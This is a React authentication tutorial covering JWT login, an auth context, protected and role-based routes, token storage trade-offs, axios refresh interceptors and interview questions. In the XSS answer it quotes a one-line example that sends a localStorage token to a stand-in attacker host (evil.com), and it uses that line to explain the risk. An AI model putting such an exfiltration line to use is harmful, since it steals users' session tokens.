Authentication Overview
What is Authentication in React?
Authentication is the process of verifying a user's identity (login). In React SPAs, it typically involves: sending credentials to a backend API, receiving a JWT token, storing it securely, and attaching it to subsequent API requests. The UI then shows/hides content based on auth state.

JWT (JSON Web Token)
JWT — JSON Web Token
JWT is a compact, self-contained token format used to securely transmit information between client and server. It consists of three parts: Header (algorithm), Payload (user data/claims), and Signature (verification). The server creates it on login, and the client sends it with every request.

⚠️ Security Rules:
• Never store sensitive data in JWT payload (it's only Base64 encoded, NOT encrypted!)
• Never trust JWT on the client side alone — always verify on the server
• Always set expiration (exp claim)
• Never put the JWT secret in frontend code
Login Flow
Login Implementation
The login flow in React involves: (1) Collecting credentials from a form, (2) Sending them to the backend API, (3) Receiving and storing the JWT token, (4) Updating auth state, (5) Redirecting to the protected page.

Login Form Component

LoginPage.jsx
import { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';

function LoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const { login } = useAuth();
  const navigate = useNavigate();
  const location = useLocation();

  // Where the user came from (redirect back after login)
  const from = location.state?.from?.pathname || '/dashboard';

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      await login(email, password);
      // Redirect to original page (or dashboard)
      navigate(from, { replace: true });
    } catch (err) {
      setError(err.response?.data?.message || 'Invalid credentials');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-container">
      <h1>Login</h1>
      {error && <div className="error-msg">{error}</div>}

      <form onSubmit={handleSubmit}>
        <input
          type="email"
          placeholder="Email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
          autoComplete="email"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
          autoComplete="current-password"
        />
        <button type="submit" disabled={loading}>
          {loading ? 'Logging in...' : 'Login'}
        </button>
      </form>
    </div>
  );
}

Auth Service (API calls)

services/authService.js
import axios from 'axios';

const API_URL = '/api/auth';

export const authService = {
  // Login — send credentials, get token
  async login(email, password) {
    const response = await axios.post(`${API_URL}/login`, {
      email,
      password
    });
    return response.data; // { accessToken, refreshToken, user }
  },

  // Register
  async register(userData) {
    const response = await axios.post(`${API_URL}/register`, userData);
    return response.data;
  },

  // Refresh access token
  async refreshToken(refreshToken) {
    const response = await axios.post(`${API_URL}/refresh`, {
      refreshToken
    });
    return response.data; // { accessToken }
  },

  // Logout (optional: invalidate refresh token on server)
  async logout(refreshToken) {
    await axios.post(`${API_URL}/logout`, { refreshToken });
  },

  // Get current user profile
  async getProfile(token) {
    const response = await axios.get(`${API_URL}/me`, {
      headers: { Authorization: `Bearer ${token}` }
    });
    return response.data;
  }
};

Auth Context (Global Auth State)

context/AuthContext.jsx
import { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { authService } from '../services/authService';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [token, setToken] = useState(null);
  const [loading, setLoading] = useState(true); // initial auth check

  // Check for existing session on app load
  useEffect(() => {
    const storedToken = localStorage.getItem('accessToken');
    if (storedToken) {
      setToken(storedToken);
      authService.getProfile(storedToken)
        .then(user => setUser(user))
        .catch(() => {
          localStorage.removeItem('accessToken');
          setToken(null);
        })
        .finally(() => setLoading(false));
    } else {
      setLoading(false);
    }
  }, []);

  const login = useCallback(async (email, password) => {
    const data = await authService.login(email, password);
    setToken(data.accessToken);
    setUser(data.user);
    localStorage.setItem('accessToken', data.accessToken);
  }, []);

  const logout = useCallback(() => {
    setToken(null);
    setUser(null);
    localStorage.removeItem('accessToken');
  }, []);

  const value = {
    user,
    token,
    isAuthenticated: !!token,
    loading,
    login,
    logout
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

// Custom hook for easy access
export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) throw new Error('useAuth must be used within AuthProvider');
  return context;
}
Protected Routes
Protected Routes — Auth Guards
Protected Routes are route guards that check if a user is authenticated before rendering a page. If not authenticated, the user is redirected to the login page. This prevents unauthorized access to private pages like dashboard, profile, settings, etc.

Basic Protected Route Component

components/ProtectedRoute.jsx
import { Navigate, useLocation } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';

function ProtectedRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();
  const location = useLocation();

  // Show loader while checking auth status
  if (loading) {
    return <div>Loading...</div>;
  }

  // Not authenticated → redirect to login
  if (!isAuthenticated) {
    return (
      <Navigate
        to="/login"
        state={{ from: location }}  {/* Save where they came from */}
        replace
      />
    );
  }

  // Authenticated → render the page
  return children;
}

Role-Based Protected Route

components/RoleRoute.jsx
function RoleRoute({ children, allowedRoles }) {
  const { user, isAuthenticated, loading } = useAuth();
  const location = useLocation();

  if (loading) return <Spinner />;

  // Not logged in → login page
  if (!isAuthenticated) {
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  // Logged in but wrong role → unauthorized page
  if (!allowedRoles.includes(user.role)) {
    return <Navigate to="/unauthorized" replace />;
  }

  return children;
}

// Usage in routes:
<Route path="/admin" element={
  <RoleRoute allowedRoles={['admin', 'super_admin']}>
    <AdminPanel />
  </RoleRoute>
} />

<Route path="/dashboard" element={
  <RoleRoute allowedRoles={['admin', 'user', 'manager']}>
    <Dashboard />
  </RoleRoute>
} />

Guest-Only Route (Reverse Guard)

components/GuestRoute.jsx
// Redirect logged-in users AWAY from login/register pages
function GuestRoute({ children }) {
  const { isAuthenticated, loading } = useAuth();

  if (loading) return <Spinner />;

  // Already logged in → redirect to dashboard
  if (isAuthenticated) {
    return <Navigate to="/dashboard" replace />;
  }

  return children;
}

// Usage:
<Route path="/login" element={<GuestRoute><LoginPage /></GuestRoute>} />
<Route path="/register" element={<GuestRoute><RegisterPage /></GuestRoute>} />

Token Storage
Token Storage — Security Considerations
Where you store the JWT token determines your app's security posture. Each storage option has different vulnerability profiles. The most secure approach is: access token in memory + refresh token in HttpOnly cookie.

Storage Options Comparison

StorageXSS Vulnerable?CSRF Vulnerable?Persists Refresh?Recommendation
localStorage✅ YES (readable by JS)❌ No✅ Yes⚠️ Convenient but risky
sessionStorage✅ YES (readable by JS)❌ No❌ No (tab only)⚠️ Same tab only
HttpOnly Cookie❌ NO (JS can't access)✅ YES (auto-sent)✅ Yes✅ Best for refresh token

Option 1: localStorage (Simple but Less Secure)

localStorage approach
// ⚠️ Simple approach — vulnerable to XSS but works for many apps
// If your app has NO user-generated HTML content, this is acceptable

// Store after login
localStorage.setItem('accessToken', token);

// Retrieve for API calls
const token = localStorage.getItem('accessToken');

// Remove on logout
localStorage.removeItem('accessToken');

// Attach to requests via Axios interceptor
axios.interceptors.request.use((config) => {
  const token = localStorage.getItem('accessToken');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

Option 2: Memory + HttpOnly Cookie (Most Secure)

Secure token management
// ✅ BEST PRACTICE:
// • Access token → JavaScript variable (memory)
// • Refresh token → HttpOnly, Secure, SameSite cookie (set by server)

// Server response sets cookie automatically:
// Set-Cookie: refreshToken=xxx; HttpOnly; Secure; SameSite=Strict; Path=/api/refresh

// ─── Client-side: token in memory only ───
let accessToken = null; // NOT in localStorage!

export function setAccessToken(token) {
  accessToken = token;
}

export function getAccessToken() {
  return accessToken;
}

// ─── Silent refresh on app load ───
// On page refresh, memory is cleared → get new access token
export async function silentRefresh() {
  try {
    // Cookie is auto-sent (HttpOnly, browser handles it)
    const response = await axios.post('/api/auth/refresh', {}, {
      withCredentials: true  // Include cookies
    });
    accessToken = response.data.accessToken;
    return true;
  } catch {
    accessToken = null;
    return false;
  }
}

Axios Interceptor with Auto-Refresh

api/axiosInstance.js
import axios from 'axios';
import { getAccessToken, setAccessToken } from './tokenManager';

const api = axios.create({
  baseURL: '/api',
  withCredentials: true  // Send cookies with requests
});

// ─── Request Interceptor: Attach token ───
api.interceptors.request.use((config) => {
  const token = getAccessToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// ─── Response Interceptor: Auto-refresh on 401 ───
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 and haven't retried yet
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Get new access token using refresh cookie
        const { data } = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true
        });
        setAccessToken(data.accessToken);

        // Retry original request with new token
        originalRequest.headers.Authorization = `Bearer ${data.accessToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed → force logout
        setAccessToken(null);
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    return Promise.reject(error);
  }
);

export default api;
⚠️ Security Vulnerabilities:
• XSS (Cross-Site Scripting): If attacker injects JS into your app, they can read localStorage tokens. Mitigation: sanitize all user input, use CSP headers, never use dangerouslySetInnerHTML with user content.
• CSRF (Cross-Site Request Forgery): If using cookies, other sites can trigger requests. Mitigation: SameSite=Strict cookie flag, CSRF tokens.
• Token theft: Never log tokens, never put in URLs, never send to 3rd-party scripts.
💡 Production Security Checklist:
✅ Use HTTPS everywhere (tokens are plain text over HTTP)
✅ Set short access token expiry (15 min)
✅ Store refresh token in HttpOnly cookie
✅ Add SameSite=Strict to cookies
✅ Implement token rotation (new refresh token each use)
✅ Sanitize all user-generated content (prevent XSS)
✅ Add Content Security Policy (CSP) headers
✅ Never expose secrets in frontend code

Full AuthProvider with Token Refresh
import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import api from '../api/axiosInstance';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const refreshTimerRef = useRef(null);

  // ─── Silent refresh on app mount ───
  useEffect(() => {
    const initAuth = async () => {
      try {
        // Try to get new access token using refresh cookie
        const { data } = await api.post('/auth/refresh');
        setUser(data.user);
        scheduleRefresh(data.expiresIn);
      } catch {
        // No valid session — user must login
        setUser(null);
      } finally {
        setLoading(false);
      }
    };
    initAuth();
    return () => clearTimeout(refreshTimerRef.current);
  }, []);

  // ─── Auto-refresh before token expires ───
  const scheduleRefresh = useCallback((expiresIn) => {
    // Refresh 1 minute before expiry
    const refreshTime = (expiresIn - 60) * 1000;
    refreshTimerRef.current = setTimeout(async () => {
      try {
        const { data } = await api.post('/auth/refresh');
        scheduleRefresh(data.expiresIn);
      } catch {
        setUser(null);
      }
    }, refreshTime);
  }, []);

  // ─── Login ───
  const login = useCallback(async (email, password) => {
    const { data } = await api.post('/auth/login', { email, password });
    setUser(data.user);
    scheduleRefresh(data.expiresIn);
  }, [scheduleRefresh]);

  // ─── Logout ───
  const logout = useCallback(async () => {
    await api.post('/auth/logout');  // Invalidate refresh token on server
    setUser(null);
    clearTimeout(refreshTimerRef.current);
  }, []);

  const value = {
    user,
    isAuthenticated: !!user,
    loading,
    login,
    logout,
    isAdmin: user?.role === 'admin'
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

export const useAuth = () => {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be inside AuthProvider');
  return ctx;
};

Interview Q&A
Authentication Interview Questions
Q: What is JWT and how does it work?
A: JWT (JSON Web Token) is a compact token format with three Base64-encoded parts: Header (algorithm), Payload (claims/user data), and Signature (verification hash). The server creates it on login using a secret key. The client sends it with every request in the Authorization header. The server verifies the signature without needing a database lookup — making it stateless and scalable.
Q: Where should you store JWT tokens in a React app?
A: The most secure approach: access token in memory (JavaScript variable) + refresh token in HttpOnly cookie (set by server). localStorage is convenient but vulnerable to XSS attacks — any injected script can steal tokens. HttpOnly cookies can't be accessed by JavaScript, preventing XSS theft. For simpler apps without user-generated content, localStorage with short token expiry is acceptable.
Q: What is the difference between access token and refresh token?
A: Access token: short-lived (15 min), sent with every API request, if stolen damage is limited. Refresh token: long-lived (7-30 days), used ONLY to get new access tokens, stored more securely (HttpOnly cookie). When access token expires, the client silently gets a new one using the refresh token — no re-login needed. Refresh tokens can be revoked on the server (blacklisted).
Q: How do you implement protected routes in React?
A: Create a wrapper component that checks isAuthenticated from auth context. If false, render <Navigate to="/login"> with the current location in state (so you can redirect back after login). If true, render children. Wrap protected routes: <Route element={<ProtectedRoute><Dashboard/></ProtectedRoute>}/>. Also handle loading state to avoid flashing the login page.
Q: How do you handle token expiration and auto-refresh?
A: Two approaches: (1) Reactive: Axios response interceptor catches 401 errors, calls /refresh endpoint, retries the original request with new token. (2) Proactive: Schedule a timer to refresh the token BEFORE it expires (e.g., 1 minute before). Proactive is better UX — users never see a failed request. Combine both for robustness.
Q: What is XSS and how does it relate to auth?
A: XSS (Cross-Site Scripting) is when an attacker injects malicious JavaScript into your app (via user input, 3rd-party scripts). If tokens are in localStorage, the injected script can steal them: fetch('evil.com?token=' + localStorage.getItem('token')). Prevention: sanitize all user input, use HttpOnly cookies (JS can't access), Content Security Policy headers, never use dangerouslySetInnerHTML with untrusted data.
Q: How do you implement role-based access control (RBAC)?
A: Store user role in JWT payload and auth context. Create a RoleRoute component that accepts allowedRoles array. Check if user.role is included — if not, redirect to /unauthorized. This handles route-level RBAC. For component-level: {user.role === 'admin' && <DeleteButton/>}. Always enforce roles on the BACKEND too — frontend RBAC is for UX only, not security.
Q: What happens when a user refreshes the page? How do you persist auth?
A: On page refresh, JavaScript memory is cleared (access token gone). Solutions: (1) Store access token in localStorage (simple, less secure). (2) Use HttpOnly refresh cookie — on app mount, call /refresh endpoint to get new access token (silent refresh). The AuthProvider runs this check in useEffect on mount, showing a loading spinner until auth state is determined.
Q: What is CSRF and how do you prevent it with cookies?
A: CSRF (Cross-Site Request Forgery) is when a malicious site triggers a request to your API — if using cookies, the browser auto-attaches them. Prevention: (1) SameSite=Strict cookie flag (browser won't send cookie from other sites), (2) CSRF tokens (random token in form, verified by server), (3) Check Origin/Referer headers on server. With SameSite=Strict and modern browsers, CSRF is largely mitigated.
